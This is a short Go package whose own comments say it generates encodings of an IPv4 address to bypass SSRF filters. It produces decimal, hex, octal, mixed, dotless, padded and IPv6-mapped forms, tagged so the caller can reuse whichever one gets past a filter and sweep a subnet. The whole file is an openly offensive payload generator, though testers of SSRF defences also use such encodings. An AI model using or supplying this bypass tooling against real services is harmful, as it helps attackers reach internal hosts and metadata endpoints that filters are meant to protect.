// Package ipenc generates alternative textual representations of an IPv4 address
// used to bypass SSRF filters that validate by string/parse rather than by the
// resolved address. Every representation is tagged with its kind so the caller
// can show which encoding worked and reuse it (e.g. to sweep a subnet).
package ipenc

import (
	"fmt"
	"net"
	"strings"
)

type Rep struct {
	Value string
	Kind  string
}

// Encode returns representations of an IPv4 address, tagged by kind.
// Returns nil if s is not a valid IPv4 address.
func Encode(s string) []Rep {
	ip := net.ParseIP(strings.TrimSpace(s))
	if ip == nil {
		return nil
	}
	ip = ip.To4()
	if ip == nil {
		return nil
	}
	a, b, c, d := uint32(ip[0]), uint32(ip[1]), uint32(ip[2]), uint32(ip[3])
	dec := a<<24 | b<<16 | c<<8 | d

	var out []Rep
	add := func(v, k string) { out = append(out, Rep{Value: v, Kind: k}) }

	add(fmt.Sprintf("%d", dec), "decimal")
	add(fmt.Sprintf("0x%08x", dec), "hex")
	add(fmt.Sprintf("0x%x.0x%x.0x%x.0x%x", a, b, c, d), "hex-dotted")
	add(fmt.Sprintf("0%o.0%o.0%o.0%o", a, b, c, d), "octal")
	add(fmt.Sprintf("0%04o.0%04o.0%04o.0%04o", a, b, c, d), "octal-padded")
	add(fmt.Sprintf("0x%x.%d.%d.%d", a, b, c, d), "mixed")
	add(fmt.Sprintf("%d.%d", a, b<<16|c<<8|d), "dotless-2")
	add(fmt.Sprintf("%d.%d.%d", a, b, c<<8|d), "dotless-3")
	add(fmt.Sprintf("%03d.%03d.%03d.%03d", a, b, c, d), "leading-zeros")
	add(fmt.Sprintf("[::ffff:%d.%d.%d.%d]", a, b, c, d), "ipv6-mapped")
	add(fmt.Sprintf("[::ffff:%x:%x]", a<<8|b, c<<8|d), "ipv6-hex")
	add(fmt.Sprintf("[0:0:0:0:0:ffff:%d.%d.%d.%d]", a, b, c, d), "ipv6-mapped-full")

	return out
}

// EncodeKinds returns only the representations whose kind matches one of the
// requested kinds (prefix match, so "hex" covers "hex-dotted", "ipv6" covers
// all ipv6-*). Empty kinds returns everything.
func EncodeKinds(s string, kinds []string) []Rep {
	all := Encode(s)
	if len(kinds) == 0 {
		return all
	}
	var out []Rep
	for _, r := range all {
		for _, k := range kinds {
			k = strings.ToLower(strings.TrimSpace(k))
			if k == "" {
				continue
			}
			if r.Kind == k || strings.HasPrefix(r.Kind, k) {
				out = append(out, r)
				break
			}
		}
	}
	return out
}
